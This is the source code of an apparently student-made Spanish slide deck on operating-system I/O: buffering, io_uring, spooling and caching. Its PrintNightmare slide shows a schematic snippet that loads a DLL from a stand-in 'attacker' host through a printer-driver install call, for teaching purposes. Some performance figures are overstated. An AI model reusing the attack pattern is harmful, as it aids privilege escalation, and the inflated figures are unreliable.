import { Deck, Slide, Stack, Code } from "@revealjs/react";
import RevealHighlight from "reveal.js/plugin/highlight";
import React from "react";
import { motion } from "framer-motion";
import {
  Zap,
  Layers,
  RotateCcw,
  ShieldAlert,
  Cpu,
  Database,
  HardDrive,
  Clock,
  ArrowRight,
  Activity,
  Printer,
} from "lucide-react";

import "reveal.js/reveal.css";
import "reveal.js/theme/dracula.css";
import "reveal.js/plugin/highlight/monokai.css";

interface MechanismProps {
  label: string;
  description: string;
  icon?: React.ReactNode;
}

const MechanismCard: React.FC<MechanismProps> = ({
  label,
  description,
  icon,
}) => (
  <motion.div
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    viewport={{ once: true }}
    style={{
      textAlign: "left",
      background: "rgba(255,255,255,0.03)",
      padding: "1.5rem",
      borderRadius: "12px",
      border: "1px solid rgba(255,255,255,0.05)",
    }}
  >
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: "1rem",
        marginBottom: "0.8rem",
      }}
    >
      {icon && <div style={{ color: "var(--accent-buf)" }}>{icon}</div>}
      <span
        style={{
          color: "var(--accent-buf)",
          fontFamily: "var(--mono)",
          fontSize: "1.1rem",
          fontWeight: "700",
        }}
      >
        {label}
      </span>
    </div>
    <p
      style={{
        margin: 0,
        fontSize: "1.4rem !important",
        color: "var(--subtext)",
      }}
    >
      {description}
    </p>
  </motion.div>
);

const AnimatedSVG: React.FC<{
  children: React.ReactNode;
  width?: string | number;
  height?: string | number;
}> = ({ children, width = "100%", height = "auto" }) => (
  <div
    style={{
      width,
      height,
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
    }}
  >
    {children}
  </div>
);

export default function App() {
  return (
    <>
      <style>{`
        :root {
          --bg: #06080f;
          --bg-dark: #06080f;
          --gray1: #1c212c;
          --gray2: #232a36;
          --line: #313342;
          --fg: #f3f6f9;
          --subtext: #A1AABB;
          --muted: #8394A3;
          --accent-buf: #7fb4ca;
          --accent-spool: #deba87;
          --accent-cache: #b7cc85;
          --accent-red: #cb7c94;
          --accent-gold: #e0c15a;
          --mono: 'IBM Plex Mono', monospace;
          --serif: 'Source Serif 4', serif;
        }
        body {
          background-color: var(--bg) !important;
        }
        .reveal {
          background-color: var(--bg) !important;
        }
        .reveal .controls { color: var(--accent-buf) !important; }
        .reveal .progress { height: 6px !important; background: rgba(255,255,255,0.1) !important; }
        .reveal .progress span { background: var(--accent-buf) !important; }
        
        .glass-card {
          background: rgba(28, 33, 44, 0.7) !important;
          backdrop-filter: blur(12px);
          border: 1px solid var(--line);
          border-radius: 24px;
          padding: 3rem;
          box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        .presenter-tag {
          font-family: var(--mono);
          font-size: 1.1rem;
          color: var(--accent-gold);
          letter-spacing: 0.15em;
          margin-bottom: 2rem;
          background: rgba(224, 193, 90, 0.1);
          padding: 0.5rem 1.5rem;
          display: inline-block;
          border-radius: 99px;
          border: 1px solid rgba(224, 193, 90, 0.2);
        }
        .technical-note {
          border-left: 4px solid var(--accent-buf);
          background: rgba(127, 180, 202, 0.05);
          padding: 1.5rem;
          margin-top: 1.5rem;
          text-align: left;
          border-radius: 0 12px 12px 0;
        }
        .reveal p, .reveal li, .reveal td {
          font-size: 2.2rem !important;
          line-height: 1.6 !important;
          color: var(--subtext);
        }
        .reveal h1, .reveal h2, .reveal h3, .reveal h4 {
          color: var(--fg) !important;
          text-transform: none !important;
          font-weight: 700 !important;
        }
        .reveal .metric-val {
          font-size: 2.5rem !important;
          font-weight: 800;
          font-family: var(--mono);
        }
        .reveal .metric-label {
          font-size: 1.1rem !important;
          font-family: var(--mono);
          text-transform: uppercase;
          letter-spacing: 0.1em;
          opacity: 0.7;
        }
        .grid-2 {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 3rem;
          align-items: center;
        }
        .metric-card {
          background: var(--gray2);
          padding: 1.5rem;
          border-radius: 16px;
          border: 1px solid var(--line);
        }
        
        /* Barra de desplazamiento personalizada */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--line); border-radius: 4px; }
        
        .reveal .slides section {
          padding: 0 !important;
        }
      `}</style>
      <Deck
        config={{
          hash: true,
          center: true,
          transition: "fade",
          transitionSpeed: "normal",
          width: 1920,
          height: 1080,
          margin: 0.05,
          minScale: 0.2,
          maxScale: 2.0,
          controls: true,
          progress: true,
        }}
        plugins={[RevealHighlight]}
      >
        {/* ── PORTADA ACADÉMICA ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              padding: "0 10%",
            }}
          >
            <motion.div
              initial={{ opacity: 0, x: -50 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8 }}
              style={{ textAlign: "left", position: "relative", zIndex: 1 }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "1rem",
                  marginBottom: "1.5rem",
                }}
              >
                <Cpu size={32} color="var(--accent-buf)" />
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.2rem",
                    color: "var(--accent-buf)",
                    letterSpacing: "0.4em",
                  }}
                >
                  CS-402 // SISTEMAS OPERATIVOS
                </span>
              </div>

              <h1
                style={{
                  fontSize: "7.5rem",
                  margin: "0.5rem 0 2rem 0",
                  fontWeight: "900",
                  letterSpacing: "-0.03em",
                  lineHeight: "0.95",
                }}
              >
                Gestión del
                <br />
                <span style={{ color: "var(--accent-gold)" }}>
                  Subsistema de E/S
                </span>
              </h1>

              <div
                style={{
                  height: "4px",
                  width: "120px",
                  background: "var(--accent-gold)",
                  marginBottom: "3.5rem",
                  borderRadius: "2px",
                }}
              ></div>

              <div className="presenter-tag">ALEX • LAURA • DIEGO</div>

              <p
                style={{
                  fontSize: "2.4rem !important",
                  maxWidth: "900px",
                  lineHeight: "1.4",
                  marginBottom: "4rem",
                  color: "var(--fg)",
                  fontFamily: "var(--serif)",
                  fontWeight: 300,
                }}
              >
                Arquitecturas de desacoplamiento: Optimización de throughput
                mediante <strong>Buffering, Spooling</strong> y{" "}
                <strong>Caching</strong>.
              </p>

              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: "2rem",
                  width: "100%",
                }}
              >
                <MechanismCard
                  icon={<Layers size={20} />}
                  label="01. BUFFERING"
                  description="Sincronización de flujos asíncronos."
                />
                <MechanismCard
                  icon={<RotateCcw size={20} />}
                  label="02. SPOOLING"
                  description="Virtualización de dispositivos exclusivos."
                />
                <MechanismCard
                  icon={<Activity size={20} />}
                  label="03. CACHING"
                  description="Localidad heurística de datos."
                />
              </div>
            </motion.div>

            <div
              style={{
                position: "absolute",
                top: "10%",
                right: "5%",
                width: "400px",
                height: "400px",
                background: "var(--accent-buf)",
                filter: "blur(150px)",
                opacity: 0.05,
                borderRadius: "50%",
              }}
            ></div>
          </div>
        </Slide>

        {/* ── TAXONOMÍA DEL GAP DE VELOCIDAD ── */}
        <Slide>
          <div style={{ padding: "0 8%" }}>
            <div style={{ textAlign: "left", marginBottom: "4rem" }}>
              <span
                style={{
                  color: "var(--accent-red)",
                  fontFamily: "var(--mono)",
                  fontSize: "1.1rem",
                  letterSpacing: "0.2em",
                }}
              >
                01 · RENDIMIENTO DEL SISTEMA
              </span>
              <h2 style={{ fontSize: "4.5rem", marginTop: "0.5rem" }}>
                Taxonomía del Gap de Latencia
              </h2>
            </div>

            <div className="grid-2">
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "1.5rem",
                }}
              >
                {[
                  {
                    label: "Registros CPU / L1",
                    val: "~1 ns",
                    color: "var(--accent-cache)",
                    icon: <Cpu size={24} />,
                    power: "10⁰",
                  },
                  {
                    label: "Memoria Principal DRAM",
                    val: "~100 ns",
                    color: "var(--accent-gold)",
                    icon: <Database size={24} />,
                    power: "10²",
                  },
                  {
                    label: "Almacenamiento NVMe SSD",
                    val: "~100 μs",
                    color: "var(--accent-buf)",
                    icon: <Zap size={24} />,
                    power: "10⁵",
                  },
                  {
                    label: "HDD Legado / Red",
                    val: "~10 ms",
                    color: "var(--accent-red)",
                    icon: <HardDrive size={24} />,
                    power: "10⁷",
                  },
                ].map((item, i) => (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -30 }}
                    whileInView={{ opacity: 1, x: 0 }}
                    transition={{ delay: i * 0.1 }}
                    className="metric-card"
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      borderLeft: `4px solid ${item.color}`,
                    }}
                  >
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1.5rem",
                      }}
                    >
                      <div style={{ color: item.color }}>{item.icon}</div>
                      <div>
                        <div className="metric-label">{item.label}</div>
                        <div
                          className="metric-val"
                          style={{ color: item.color }}
                        >
                          {item.val}
                        </div>
                      </div>
                    </div>
                    <div style={{ textAlign: "right", opacity: 0.4 }}>
                      <div
                        style={{
                          fontSize: "0.7rem",
                          fontFamily: "var(--mono)",
                        }}
                      >
                        MAGNITUD
                      </div>
                      <div style={{ fontSize: "1.5rem", fontWeight: 800 }}>
                        {item.power}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>

              <div className="glass-card" style={{ padding: "3.5rem" }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "1.5rem",
                  }}
                >
                  <ShieldAlert
                    size={48}
                    color="var(--accent-red)"
                    style={{ flexShrink: 0 }}
                  />
                  <div>
                    <h4 style={{ fontSize: "2.5rem", marginBottom: "1.5rem" }}>
                      Impacto Arquitectónico
                    </h4>
                    <p
                      style={{
                        fontSize: "2.2rem !important",
                        lineHeight: "1.4",
                      }}
                    >
                      Esta disparidad de <strong>7 órdenes de magnitud</strong>{" "}
                      implica que la CPU pasa el 99.9% de sus ciclos en{" "}
                      <code>I/O WAIT</code> sin capas de abstracción.
                    </p>
                    <div
                      style={{
                        marginTop: "2.5rem",
                        display: "flex",
                        flexDirection: "column",
                        gap: "1rem",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Desacoplamiento Productor-Consumidor
                        </span>
                      </div>
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Independencia de Dispositivo (VFS)
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── BUFFERING ── */}
        <Stack>
          <Slide>
            <div style={{ padding: "0 8%" }}>
              <div
                className="glass-card"
                style={{ borderLeft: "12px solid var(--accent-buf)" }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "3rem",
                  }}
                >
                  <div>
                    <span
                      style={{
                        color: "var(--accent-buf)",
                        fontFamily: "var(--mono)",
                        fontSize: "1.1rem",
                        letterSpacing: "0.2em",
                      }}
                    >
                      MECANISMO 01
                    </span>
                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>
                      Buffering: Sincronía Asíncrona
                    </h2>
                  </div>
                  <Layers
                    size={80}
                    color="var(--accent-buf)"
                    style={{ opacity: 0.2 }}
                  />
                </div>

                <div className="grid-2">
                  <div
                    style={{
                      borderRight: "1px solid var(--line)",
                      paddingRight: "3rem",
                    }}
                  >
                    <h4
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                        marginBottom: "2rem",
                      }}
                    >
                      <Zap size={24} color="var(--accent-buf)" /> Objetivos
                      Primordiales
                    </h4>
                    <ul
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "1.5rem",
                      }}
                    >
                      <li>
                        <strong>Speed Matching:</strong> Normalización del
                        throughput entre hardware dispar.
                      </li>
                      <li>
                        <strong>Data Size Matching:</strong> Fragmentación de
                        flujos en bloques óptimos de hardware.
                      </li>
                      <li>
                        <strong>Copy Semantics:</strong> Integridad de datos
                        mediante snapshots en <code>copy_to_user</code>.
                      </li>
                    </ul>
                  </div>
                  <div>
                    <h4
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                        marginBottom: "2rem",
                      }}
                    >
                      <Activity size={24} color="var(--accent-buf)" /> Modelos
                      de Implementación
                    </h4>
                    <div
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "1.5rem",
                      }}
                    >
                      <div className="metric-card">
                        <code
                          style={{
                            color: "var(--accent-gold)",
                            fontWeight: 700,
                          }}
                        >
                          Double Buffering:
                        </code>
                        <p
                          style={{
                            fontSize: "1.8rem !important",
                            marginTop: "0.5rem",
                          }}
                        >
                          Llenado/vaciado paralelo mediante DMA para eliminar el
                          overhead del procesador.
                        </p>
                      </div>
                      <div className="metric-card">
                        <code
                          style={{
                            color: "var(--accent-gold)",
                            fontWeight: 700,
                          }}
                        >
                          Circular Queue:
                        </code>
                        <p
                          style={{
                            fontSize: "1.8rem !important",
                            marginTop: "0.5rem",
                          }}
                        >
                          Estructura de anillo O(1) utilizada en stacks de red
                          de baja latencia.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide>
            <div style={{ padding: "0 10%" }}>
              <div style={{ textAlign: "left", marginBottom: "4rem" }}>
                <span
                  style={{
                    color: "var(--accent-gold)",
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                  }}
                >
                  E/S DE NUEVA GENERACIÓN
                </span>
                <h2 style={{ fontSize: "4.5rem" }}>Evolución: io_uring</h2>
                <p style={{ fontSize: "2.2rem", color: "var(--accent-buf)" }}>
                  Eficiencia Asíncrona con Cero Syscalls
                </p>
              </div>
              <div className="grid-2" style={{ marginTop: "3rem" }}>
                <div className="technical-note">
                  <h4 style={{ marginBottom: "1rem" }}>
                    Submission Queue (SQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    Las apps envían descriptores a anillos mapeados en memoria.{" "}
                    <strong>Sin cambios de contexto.</strong>
                  </p>
                </div>
                <div
                  className="technical-note"
                  style={{ borderColor: "var(--accent-gold)" }}
                >
                  <h4 style={{ marginBottom: "1rem" }}>
                    Completion Queue (CQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    El Kernel notifica resultados asíncronamente.{" "}
                    <strong>Procesamiento por lotes</strong> extremo.
                  </p>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── SPOOLING ── */}
        <Stack>
          <Slide>
            <div style={{ padding: "0 8%" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "4rem",
                }}
              >
                <RotateCcw size={60} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "5rem", margin: 0 }}>
                  Arquitectura de Spooling
                </h2>
              </div>

              <div className="glass-card">
                <table
                  style={{
                    width: "100%",
                    borderCollapse: "separate",
                    borderSpacing: "0 1rem",
                  }}
                >
                  <thead>
                    <tr
                      style={{
                        color: "var(--accent-spool)",
                        fontSize: "1.2rem",
                        fontFamily: "var(--mono)",
                      }}
                    >
                      <th style={{ padding: "1rem 2rem", textAlign: "left" }}>
                        CARACTERÍSTICA
                      </th>
                      <th style={{ padding: "1rem 2rem", textAlign: "left" }}>
                        BUFFERING
                      </th>
                      <th style={{ padding: "1rem 2rem", textAlign: "left" }}>
                        SPOOLING
                      </th>
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      {
                        attr: "Medio Principal",
                        buf: "DRAM (Volátil)",
                        spool: "Disco (Persistente)",
                        icon: <Database size={18} />,
                      },
                      {
                        attr: "Unidad de Datos",
                        buf: "Bloques / Bytes",
                        spool: "Trabajos / Documentos",
                        icon: <Layers size={18} />,
                      },
                      {
                        attr: "Propósito Core",
                        buf: "Normalización de Velocidad",
                        spool: "Multi-tenencia de Dispositivo",
                        icon: <RotateCcw size={18} />,
                      },
                      {
                        attr: "Visibilidad Usuario",
                        buf: "Transparente (Implícito)",
                        spool: "Explícito (Colas de Impresión)",
                        icon: <Printer size={18} />,
                      },
                    ].map((row, i) => (
                      <tr
                        key={i}
                        style={{
                          background: "rgba(255,255,255,0.02)",
                          borderRadius: "12px",
                        }}
                      >
                        <td
                          style={{
                            padding: "2rem",
                            borderTopLeftRadius: "12px",
                            borderBottomLeftRadius: "12px",
                            color: "var(--fg)",
                            fontWeight: 600,
                          }}
                        >
                          <div
                            style={{
                              display: "flex",
                              alignItems: "center",
                              gap: "1rem",
                            }}
                          >
                            {row.icon} {row.attr}
                          </div>
                        </td>
                        <td
                          style={{ padding: "2rem", color: "var(--subtext)" }}
                        >
                          {row.buf}
                        </td>
                        <td
                          style={{
                            padding: "2rem",
                            color: "var(--accent-spool)",
                            borderTopRightRadius: "12px",
                            borderBottomRightRadius: "12px",
                            fontWeight: 600,
                          }}
                        >
                          {row.spool}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── CACHING ── */}
        <Stack>
          <Slide>
            <div className="grid-2" style={{ height: "100%", padding: "0 8%" }}>
              <motion.div
                initial={{ opacity: 0, x: -50 }}
                whileInView={{ opacity: 1, x: 0 }}
                style={{ textAlign: "left" }}
              >
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "1rem",
                    color: "var(--accent-cache)",
                    marginBottom: "1.5rem",
                  }}
                >
                  <Activity size={32} />
                  <span
                    style={{
                      fontFamily: "var(--mono)",
                      fontSize: "1.1rem",
                      letterSpacing: "0.2em",
                    }}
                  >
                    MECANISMO 03
                  </span>
                </div>
                <h2
                  style={{
                    fontSize: "5.5rem",
                    marginBottom: "3rem",
                    lineHeight: 1,
                  }}
                >
                  Localidad
                  <br />
                  <span style={{ color: "var(--accent-cache)" }}>
                    Heurística de Datos
                  </span>
                </h2>

                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "2rem",
                  }}
                >
                  <div
                    className="metric-card"
                    style={{ borderLeft: "6px solid var(--accent-cache)" }}
                  >
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                        marginBottom: "0.5rem",
                      }}
                    >
                      <Clock size={20} color="var(--accent-cache)" />
                      <h4 style={{ fontSize: "2rem !important", margin: 0 }}>
                        Localidad Temporal
                      </h4>
                    </div>
                    <p style={{ fontSize: "1.8rem !important", margin: 0 }}>
                      <strong>Regla de Recencia:</strong> Los datos accedidos
                      recientemente tienen alta probabilidad de reuso inmediato.
                    </p>
                  </div>
                  <div
                    className="metric-card"
                    style={{ borderLeft: "6px solid var(--accent-cache)" }}
                  >
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1rem",
                        marginBottom: "0.5rem",
                      }}
                    >
                      <Layers size={20} color="var(--accent-cache)" />
                      <h4 style={{ fontSize: "2rem !important", margin: 0 }}>
                        Localidad Espacial
                      </h4>
                    </div>
                    <p style={{ fontSize: "1.8rem !important", margin: 0 }}>
                      <strong>Regla de Proximidad:</strong> Acceder a X implica
                      que X+1 será necesario pronto (Read-Ahead).
                    </p>
                  </div>
                </div>
              </motion.div>

              <div className="glass-card" style={{ padding: "4rem" }}>
                <h4
                  style={{
                    fontSize: "3rem",
                    marginBottom: "4rem",
                    textAlign: "center",
                  }}
                >
                  Matemática de la Eficiencia
                </h4>

                <div style={{ marginBottom: "4rem" }}>
                  <div
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      marginBottom: "1.5rem",
                    }}
                  >
                    <span style={{ fontSize: "1.8rem", fontWeight: 600 }}>
                      Hit Rate (Optimización VFS)
                    </span>
                    <span
                      style={{
                        color: "var(--accent-cache)",
                        fontWeight: "800",
                        fontSize: "2.5rem",
                      }}
                    >
                      98.2%
                    </span>
                  </div>
                  <div
                    style={{
                      height: "16px",
                      background: "var(--line)",
                      borderRadius: "8px",
                      overflow: "hidden",
                      padding: "3px",
                    }}
                  >
                    <motion.div
                      initial={{ width: 0 }}
                      whileInView={{ width: "98.2%" }}
                      transition={{ duration: 1.5, ease: "easeOut" }}
                      style={{
                        height: "100%",
                        background:
                          "linear-gradient(90deg, var(--accent-buf), var(--accent-cache))",
                        borderRadius: "5px",
                      }}
                    />
                  </div>
                </div>

                <div
                  className="technical-note"
                  style={{
                    background: "rgba(255,255,255,0.03)",
                    borderLeftColor: "var(--accent-cache)",
                  }}
                >
                  <p
                    style={{
                      fontSize: "1.8rem !important",
                      color: "var(--fg)",
                      fontStyle: "italic",
                    }}
                  >
                    "Un incremento del 1% en el Hit Rate para cachés de disco
                    puede generar una <strong>reducción del 50%</strong> en el
                    tiempo de acceso efectivo (EAT)."
                  </p>
                </div>
              </div>
            </div>
          </Slide>

          <Slide>
            <div style={{ padding: "0 8%" }}>
              <h2
                style={{
                  fontSize: "4.5rem",
                  marginBottom: "4rem",
                  textAlign: "left",
                }}
              >
                La Distinción Crítica
              </h2>

              <div className="grid-2">
                <motion.div
                  whileHover={{ scale: 1.02 }}
                  className="glass-card"
                  style={{ borderTop: "8px solid var(--accent-buf)" }}
                >
                  <h3
                    style={{ color: "var(--accent-buf)", marginBottom: "2rem" }}
                  >
                    Buffering
                  </h3>
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      color: "var(--fg)",
                    }}
                  >
                    La <strong>Autoridad Exclusiva</strong> del dato. Es el
                    único lugar donde reside el dato válido durante el
                    transporte.
                  </p>
                  <div
                    style={{
                      marginTop: "3rem",
                      padding: "1rem",
                      background: "rgba(203, 124, 148, 0.1)",
                      borderRadius: "12px",
                      border: "1px solid rgba(203, 124, 148, 0.2)",
                    }}
                  >
                    <span
                      style={{ color: "var(--accent-red)", fontWeight: 800 }}
                    >
                      PELIGRO:
                    </span>{" "}
                    Borrado = Pérdida de Datos.
                  </div>
                </motion.div>

                <motion.div
                  whileHover={{ scale: 1.02 }}
                  className="glass-card"
                  style={{ borderTop: "8px solid var(--accent-cache)" }}
                >
                  <h3
                    style={{
                      color: "var(--accent-cache)",
                      marginBottom: "2rem",
                    }}
                  >
                    Caching
                  </h3>
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      color: "var(--fg)",
                    }}
                  >
                    Un <strong>Proxy Redundante</strong>. Una copia secundaria
                    diseñada para la velocidad. El original persiste en el medio
                    lento.
                  </p>
                  <div
                    style={{
                      marginTop: "3rem",
                      padding: "1rem",
                      background: "rgba(224, 193, 90, 0.1)",
                      borderRadius: "12px",
                      border: "1px solid rgba(224, 193, 90, 0.2)",
                    }}
                  >
                    <span
                      style={{ color: "var(--accent-gold)", fontWeight: 800 }}
                    >
                      RESULTADO:
                    </span>{" "}
                    Borrado = Caída de Rendimiento.
                  </div>
                </motion.div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── CASO DE SEGURIDAD ── */}
        <Slide>
          <div style={{ padding: "0 8%" }}>
            <div className="grid-2">
              <div style={{ textAlign: "left" }}>
                <span
                  className="presenter-tag"
                  style={{
                    background: "rgba(203, 124, 148, 0.1)",
                    color: "var(--accent-red)",
                    borderColor: "rgba(203, 124, 148, 0.3)",
                  }}
                >
                  AUDITORÍA DE SEGURIDAD // CVE-2021-34527
                </span>
                <h2 style={{ fontSize: "5rem", margin: "1rem 0 2.5rem 0" }}>
                  PrintNightmare
                </h2>
                <div
                  className="glass-card"
                  style={{ borderColor: "rgba(203, 124, 148, 0.3)" }}
                >
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      color: "var(--fg)",
                    }}
                  >
                    Los servicios de Spooler legados ejecutándose como{" "}
                    <code>SYSTEM</code> permitieron la Ejecución Remota de
                    Código mediante la inyección de DLLs arbitrarias.
                  </p>
                  <div
                    style={{
                      marginTop: "2rem",
                      display: "flex",
                      alignItems: "center",
                      gap: "1rem",
                      color: "var(--accent-red)",
                    }}
                  >
                    <ShieldAlert size={24} />
                    <span style={{ fontWeight: 700 }}>
                      Vector de Escalamiento de Privilegios
                    </span>
                  </div>
                </div>
              </div>

              <div style={{ position: "relative" }}>
                <Code
                  language="javascript"
                  lineNumbers="1|3-5"
                  style={{
                    fontSize: "1.4rem",
                    borderRadius: "24px",
                    padding: "2rem",
                    boxShadow: "0 30px 60px rgba(0,0,0,0.5)",
                  }}
                >
                  {`// Ataque RpcAddPrinterDriverEx
// Escalando a privilegios SYSTEM
const maliciousPath = "\\\\\\\\attacker\\\\exploit.dll";

// Disparando la vulnerabilidad del Spooler
installDriver(maliciousPath); 

// Resultado: Compromiso Total del Kernel`}
                </Code>

                <div
                  className="technical-note"
                  style={{
                    marginTop: "2.5rem",
                    borderColor: "var(--accent-red)",
                  }}
                >
                  <h4
                    style={{
                      fontSize: "1.8rem !important",
                      color: "var(--fg)",
                    }}
                  >
                    Principio de Mitigación
                  </h4>
                  <p style={{ fontSize: "1.6rem !important" }}>
                    Transición hacia el <strong>Aislamiento de Procesos</strong>{" "}
                    y el Principio de Menor Privilegio.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── CONCLUSIÓN ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              whileInView={{ scale: 1, opacity: 1 }}
              className="glass-card"
              style={{
                maxWidth: "1200px",
                textAlign: "center",
                padding: "5rem",
              }}
            >
              <h2 style={{ fontSize: "6rem", marginBottom: "3rem" }}>
                Conclusión Técnica
              </h2>
              <p
                style={{
                  fontSize: "3rem !important",
                  lineHeight: "1.3",
                  color: "var(--fg)",
                  marginBottom: "4rem",
                }}
              >
                La eficiencia de los sistemas operativos modernos no reside solo
                en la velocidad del hardware, sino en la{" "}
                <strong>inteligencia arquitectónica</strong> de la gestión de
                latencia.
              </p>

              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  gap: "4rem",
                }}
              >
                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-buf)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <Layers size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    DESACOPLAMIENTO
                  </div>
                </div>
                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-gold)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <RotateCcw size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    VIRTUALIZACIÓN
                  </div>
                </div>
                <div style={{ textAlign: "center" }}>
                  <div
                    style={{
                      color: "var(--accent-cache)",
                      marginBottom: "0.5rem",
                    }}
                  >
                    <Activity size={40} />
                  </div>
                  <div
                    style={{
                      fontSize: "1rem",
                      opacity: 0.5,
                      fontFamily: "var(--mono)",
                    }}
                  >
                    OPTIMIZACIÓN
                  </div>
                </div>
              </div>

              <div
                style={{
                  borderTop: "1px solid var(--line)",
                  paddingTop: "3rem",
                  marginTop: "5rem",
                  opacity: 0.3,
                }}
              >
                <p style={{ fontSize: "1.2rem", fontFamily: "var(--mono)" }}>
                  CS-402 // SISTEMAS OPERATIVOS // 2026
                </p>
              </div>
            </motion.div>
          </div>
        </Slide>
      </Deck>
    </>
  );
}
